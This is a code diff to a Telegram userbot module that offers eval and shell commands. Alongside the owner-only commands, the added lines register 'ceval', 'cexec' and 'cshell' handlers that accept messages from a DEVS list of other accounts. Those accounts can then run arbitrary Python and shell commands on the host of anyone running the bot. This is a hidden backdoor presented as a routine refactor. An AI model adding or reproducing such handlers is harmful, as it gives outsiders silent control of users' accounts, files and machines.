@@ -21,12 +21,7 @@ from pyrogram import *
 from pyromod import *
 
 from . import *
-from pyrogram import Client as ren
-from Ubot.modules.basic.carbon import make_carbon
-from ubotlibs.ubot.helper.PyroHelpers import *
-from ubotlibs.ubot.utils import *
-
-
+from ubotlibs.ubot.helper import ReplyCheck
 
 from pyrogram.raw import *
 from pyrogram.raw.types import *
@@ -39,13 +34,13 @@ from pyrogram.raw.types import InputGroupCall, InputPeerChannel, InputPeerChat
 mod = randint
 cheat = 10000, 999999999
 
-@ren.on_message(filters.command("screenls", ".") & filters.me)
-async def screen(client, message):
+@Client.on_message(filters.command("screenls", cmds) & filters.me)
+async def screen(c, m):
     screen = (await shell_exec("screen -ls"))[0]
-    await message.reply(f"<code>{screen}</code>")
+    await m.reply(f"<code>{screen}</code>")
 
-
-@Ubot("e", ".")
+@Client.on_message(filters.command(["ceval", "cev", "ce"], cmds) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command(["eval", "ev", "e"], cmds) & filters.me)
 async def evaluation_cmd_t(client, message):
     status_message = await message.reply("`Processing eval..`")
     try:
@@ -103,22 +98,13 @@ async def evaluation_cmd_t(client, message):
         await status_message.edit(final_output, parse_mode=enums.ParseMode.MARKDOWN)
 
 
-@ren.on_edited_message(filters.command(["shell", "exec"], ".") & filters.me)
-async def execution_func_edited(bot, message):
-    await execution(bot, message)
-
-
-@ren.on_message(filters.command(["shell", "exec"], ".") & filters.me)
-async def execution_func(bot, message):
-    await execution(bot, message)
-
-
-async def aexec(code, client, message):
+async def aexec(code, c, m):
     exec(
         "async def __aexec(c, m): "
         + "".join(f"\n {l_}" for l_ in code.split("\n"))
     )
-    return await locals()["__aexec"](client, message)
+    return await locals()["__aexec"](c, m)
+
 
 async def shell_exec(code, treat=True):
     process = await asyncio.create_subprocess_shell(
@@ -130,7 +116,18 @@ async def shell_exec(code, treat=True):
         stdout = stdout.decode().strip()
     return stdout, process
 
-async def execution(bot, message):
+
+@Client.on_edited_message(filters.command(["cshell", "cexec"], cmds) & filters.user(DEVS) & ~filters.me)
+@Client.on_edited_message(filters.command(["shell", "exec"], cmds) & filters.me)
+async def execution_func_edited(bot, message):
+    await execution(bot, message)
+
+@Client.on_message(filters.command(["cshell", "cexec"], cmds) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command(["shell", "exec"], cmds) & filters.me)
+async def execution_func(bot, message):
+    await execution(bot, message)
+
+async def execution(bot: Client, message: Message):
     cmd = message.text.split(" ", maxsplit=1)[1]
 
     reply_to_id = message.id
